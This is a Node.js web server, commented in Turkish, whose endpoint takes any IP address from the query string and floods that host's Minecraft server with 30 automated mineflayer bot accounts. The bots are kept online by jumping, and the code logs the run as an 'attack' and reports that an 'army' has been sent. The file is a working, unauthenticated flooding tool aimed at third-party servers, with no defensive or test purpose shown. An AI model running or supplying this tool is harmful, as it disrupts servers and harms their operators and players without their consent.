const express = require('express');
const mineflayer = require('mineflayer');
const cors = require('cors');
const app = express();
const port = process.env.PORT || 10000;

app.use(cors());

let activeBots = [];

app.get('/bot-gonder', (req, res) => {
    const { ip, isim } = req.query;
    const miktar = 30; 

    console.log(`[SALDIRI] ${miktar} bot yola çıktı: ${ip}`);

    for (let i = 1; i <= miktar; i++) {
        setTimeout(() => {
            const nick = `${isim}_${i}`;
            const bot = mineflayer.createBot({
                host: ip,
                port: 25565,
                username: nick,
                version: "1.20.1",
                hideErrors: true,
                connectTimeout: 30000
            });

            bot.on('spawn', () => {
                console.log(`[+] ${nick} sunucuda.`);
                // Botun sunucuda kalması için küçük hareketler
                setInterval(() => { if(bot.entity) bot.setControlState('jump', true); }, 3000);
            });

            bot.on('error', (err) => console.log(`[!] ${nick} Hatası: ${err.message}`));
            bot.on('kicked', (reason) => console.log(`[-] ${nick} Atıldı.`));

            activeBots.push(bot);
        }, i * 500); // Yarım saniye arayla gönder (Render kilitlenmesin diye)
    }
    res.send("Ordu Gönderildi!");
});

app.get('/bot-temizle', (req, res) => {
    activeBots.forEach(b => b.quit());
    activeBots = [];
    res.send("Bütün botlar çıkarıldı.");
});

app.get('/bot-zipla', (req, res) => res.send("OK"));
app.listen(port, '0.0.0.0', () => console.log("Bot Motoru Aktif!"));
